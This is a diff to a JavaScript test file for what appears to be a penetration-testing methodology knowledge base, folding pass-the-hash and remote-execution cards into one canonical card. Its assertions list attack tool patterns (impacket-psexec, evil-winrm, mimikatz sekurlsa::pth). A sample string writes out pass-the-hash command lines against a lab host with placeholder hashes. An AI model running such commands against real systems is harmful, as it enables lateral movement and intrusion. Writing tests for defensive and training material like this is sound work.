@@ -13,6 +13,7 @@ globalThis.addEventListener=undefined;
 load('data/current-release.js');
 assert.ok(versionAtLeast(globalThis.OBOL_CURRENT_RELEASE.label,'v9.85'),'current release should be v9.85 or newer');
 assert.ok(globalThis.OBOL_CURRENT_RELEASE.productHardeningExtensions.includes('data/product-hardening/pass-the-hash-remote-exec-cluster-v9.85.js'));
+assert.ok(globalThis.OBOL_CURRENT_RELEASE.productHardeningExtensions.includes('data/product-hardening/pass-the-hash-remote-exec-card-provenance-v9.85.js'));
 
 load('data/product-hardening/product-hardening-queue.js');
 load('data/product-hardening/work-packages.js');
@@ -32,45 +33,39 @@ assert.strictEqual(wave.activeQueueId,'source-note-cluster-pass-the-hash-and-rem
 assert.strictEqual(wave.clusterId,'pass-the-hash-and-remote-exec-artifacts');
 assert.strictEqual(wave.nextQueueId,'source-note-cluster-shells-payloads-and-file-transfer-stabilization');
 assert.strictEqual(wave.primaryCardId,'pass-the-hash-proof-chain');
-assert.deepStrictEqual(wave.enrichedCardIds,['pass-the-hash-proof-chain','pth-remote-exec-artifacts','pth-token-filtering-check']);
+assert.deepStrictEqual(wave.enrichedCardIds,['pass-the-hash-proof-chain']);
+assert.deepStrictEqual(wave.foldedAliasIds,['pth-remote-exec-artifacts','pth-token-filtering-check']);
 assert.strictEqual(wave.reviewTextChars,476854);
 assert.strictEqual(wave.noteCount,14);
 assert.deepStrictEqual(wave.failures,[]);
-assert.ok(wave.notesIntegrated&&wave.pthIntegrated&&wave.remoteIntegrated&&wave.tokenIntegrated&&wave.analyzerIntegrated&&wave.clusterCompleted&&wave.queuePatched);
+assert.ok(wave.notesIntegrated&&wave.pthIntegrated&&wave.analyzerIntegrated&&wave.clusterCompleted&&wave.queuePatched&&wave.foldedAliases);
+assert.ok(globalThis.OBOL_PTH_REMOTE_EXEC_CARD_PROVENANCE_V985&&globalThis.OBOL_PTH_REMOTE_EXEC_CARD_PROVENANCE_V985.status==='live-integrated');
 
 const notes=globalThis.OBOL_NOTE_INTEGRATION.publicFieldNotes||[];
 const noteIds=new Set(notes.map(note=>note&&note.id).filter(Boolean));
 for(const id of wave.publicNoteIds)assert.ok(noteIds.has(id),'missing v9.85 public field note '+id);
 for(const note of notes.filter(note=>note&&wave.publicNoteIds.includes(note.id))){
- const ids=note.cardIds||[];
- assert.ok(ids.every(id=>wave.enrichedCardIds.includes(id)),'v9.85 notes must bind only to existing PtH cards');
- assert.ok(!ids.includes('pass-the-hash-and-remote-exec-artifacts'),'cluster label must not become a card binding');
+ assert.deepStrictEqual(note.cardIds,['pass-the-hash-proof-chain'],'v9.85 notes must bind only to canonical PtH card');
+ assert.deepStrictEqual(note.pathIds,['pass-the-hash-proof-chain'],'v9.85 path notes must bind only to canonical PtH card');
 }
 assert.ok(!(globalThis.CARDS&&globalThis.CARDS['remote-exec-artifact-proof-card']),'proposed remote-exec proof card should not become a wrapper card');
+assert.ok(!(globalThis.CARDS&&globalThis.CARDS['pth-remote-exec-artifacts']),'folded remote-exec alias must not remain a primary card');
+assert.ok(!(globalThis.CARDS&&globalThis.CARDS['pth-token-filtering-check']),'folded token-filtering alias must not remain a primary card');
 
 const pth=globalThis.CARDS&&globalThis.CARDS['pass-the-hash-proof-chain'];
 assert.ok(pth,'PtH proof-chain card should remain addressable');
 assert.strictEqual((pth.passTheHashRemoteExec85||{}).integratedInto,'existing-card');
+assert.deepStrictEqual(pth.foldedFrom.slice(-2),['pth-remote-exec-artifacts','pth-token-filtering-check']);
 for(const row of pth.commands||[])assert.ok(row.tool&&row.run&&row.when&&row.evidence&&row.note,'PtH command needs full action-spine fields');
 const runs=(pth.commands||[]).map(row=>String(row.run||''));
-for(const expected of [/nxc smb/i,/impacket-psexec/i,/impacket-wmiexec/i,/impacket-smbexec/i,/impacket-atexec/i,/evil-winrm/i,/xfreerdp/i,/sekurlsa::pth/i,/LocalAccountTokenFilterPolicy/i,/sc\.exe/i])assert.ok(runs.some(run=>expected.test(run)),'missing PtH command pattern '+expected);
-for(const fact of ['auth.nt_hash_scope_reviewed','auth.pth_protocol_validation_reviewed','auth.remote_exec_artifact_reviewed','auth.token_filtering_reviewed','auth.pth_failure_disposition_reviewed','auth.pth_cleanup_reviewed','evidence.pth_report_boundary_reviewed'])assert.ok((pth.produces||[]).includes(fact),'PtH card missing produced fact '+fact);
-assert.ok(JSON.stringify(pth).includes('SMB authentication admin share write SCM control and shell proof separated'));
-assert.ok(JSON.stringify(pth).includes('Token filtering restricted-admin and remote-UAC policy considered'));
-assert.ok(!/source-mining|release cleanup|patch panel|\bUNKNOWN\b|methodology gap|stabilizer/i.test(JSON.stringify(pth)),'PtH card must not leak implementation slop');
-
-const remote=globalThis.CARDS&&globalThis.CARDS['pth-remote-exec-artifacts'];
-assert.ok(remote,'remote execution artifact card should remain addressable');
-assert.strictEqual((remote.passTheHashRemoteExec85||{}).integratedInto,'existing-card');
-assert.ok((remote.commands||[]).some(row=>/Get-WinEvent|operator-cleanup|impacket-psexec/i.test(String(row.run||''))));
-assert.ok((remote.produces||[]).includes('cleanup.remote_exec_recorded'));
-
-const token=globalThis.CARDS&&globalThis.CARDS['pth-token-filtering-check'];
-assert.ok(token,'token filtering card should remain addressable');
-assert.strictEqual((token.passTheHashRemoteExec85||{}).integratedInto,'existing-card');
-const tokenText=JSON.stringify(token);
-for(const expected of ['LocalAccountTokenFilterPolicy','FilterAdministratorToken','DisableRestrictedAdmin','Restricted Admin'])assert.ok(tokenText.includes(expected),'token filtering card missing '+expected);
-assert.ok((token.produces||[]).includes('auth.restricted_admin_reviewed'));
+for(const expected of [/nxc smb/i,/impacket-psexec/i,/impacket-wmiexec/i,/impacket-smbexec/i,/impacket-atexec/i,/evil-winrm/i,/xfreerdp/i,/sekurlsa::pth/i,/LocalAccountTokenFilterPolicy/i,/DisableRestrictedAdmin/i,/sc\.exe/i,/Separate SMB authentication/i,/Classify failed PtH attempts/i])assert.ok(runs.some(run=>expected.test(run)),'missing PtH command pattern '+expected);
+for(const fact of ['auth.nt_hash_scope_reviewed','auth.pth_protocol_validation_reviewed','auth.remote_exec_artifact_reviewed','auth.token_filtering_reviewed','auth.restricted_admin_reviewed','auth.local_account_scope_reviewed','auth.pth_failure_disposition_reviewed','auth.pth_cleanup_reviewed','cleanup.remote_exec_recorded','evidence.pth_report_boundary_reviewed'])assert.ok((pth.produces||[]).includes(fact),'PtH card missing produced fact '+fact);
+const pthText=JSON.stringify(pth);
+assert.ok(pthText.includes('SMB authentication admin share write SCM control and shell proof separated'));
+assert.ok(pthText.includes('Token filtering restricted-admin and remote-UAC policy considered'));
+assert.ok(pthText.includes('Remote execution artifacts and cleanup recorded'));
+for(const expected of ['LocalAccountTokenFilterPolicy','FilterAdministratorToken','DisableRestrictedAdmin','Restricted Admin','cleanup.remote_exec_recorded'])assert.ok(pthText.includes(expected),'canonical PtH card missing folded alias content '+expected);
+assert.ok(!/source-mining|source re-mining|release cleanup|patch panel|\bUNKNOWN\b|methodology gap|stabilizer/i.test(pthText),'PtH card must not leak implementation slop');
 
 const sample='nxc smb dc01.lab -u alice -H AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA --local-auth authentication succeeded Pwn3d! Found writable share ADMIN$ Opening SVCManager Creating service TST Starting service TST Microsoft Windows [Version 10.0] C:\\Windows\\system32> impacket-psexec LAB/alice@dc01 -hashes :BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB evil-winrm -i dc01 -u alice -H CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC xfreerdp /v:dc01 /u:alice /pth:DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD /restricted-admin reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy STATUS_ACCESS_DENIED Service TST deleted cleanup complete HTB{secret} OS{secret} Answer: flag';
 const analysis=globalThis.OBOL_PTH_REMOTE_EXEC_PACKET_V985.analyze(sample);
@@ -88,7 +83,7 @@ assert.ok(clusters&&clusters.status,'source cluster ledger should remain exposed
 assert.strictEqual(clusters.status.latestCompletedClusterQueue,'source-note-cluster-pass-the-hash-and-remote-exec-artifacts');
 assert.strictEqual(clusters.status.latestCompletedClusterId,'pass-the-hash-and-remote-exec-artifacts');
 assert.strictEqual(clusters.status.latestCompletedClusterReviewTextChars,476854);
-assert.deepStrictEqual(clusters.status.latestCompletedClusterOwnerCards,['pass-the-hash-proof-chain','pth-remote-exec-artifacts','pth-token-filtering-check']);
+assert.deepStrictEqual(clusters.status.latestCompletedClusterOwnerCards,['pass-the-hash-proof-chain']);
 assert.strictEqual(clusters.status.reviewedSourceNotes,362);
 assert.strictEqual(clusters.status.pendingSourceNotes,194);
 assert.strictEqual(clusters.status.clusteredPendingNotes,194);
@@ -114,5 +109,6 @@ run(['tools/validate-product-hardening-card-routes.js']);
 run(['tools/validate-note-card-path-placement.js']);
 run(['tools/validate-actionable-next-step-cards.js']);
 run(['tools/validate-action-first-card-cleanup.js']);
+run(['tools/validate-path-card-uniqueness-v9.72.js']);
 run(['tools/validate-release-pr.js','--repo-only','--release-version=9.85']);
-console.log('v9.85 mined pass-the-hash, remote execution artifacts, token filtering, and dashboard queue handoff.');
+console.log('v9.85 mined pass-the-hash, remote execution artifacts, token filtering, folded aliases, and dashboard queue handoff.');
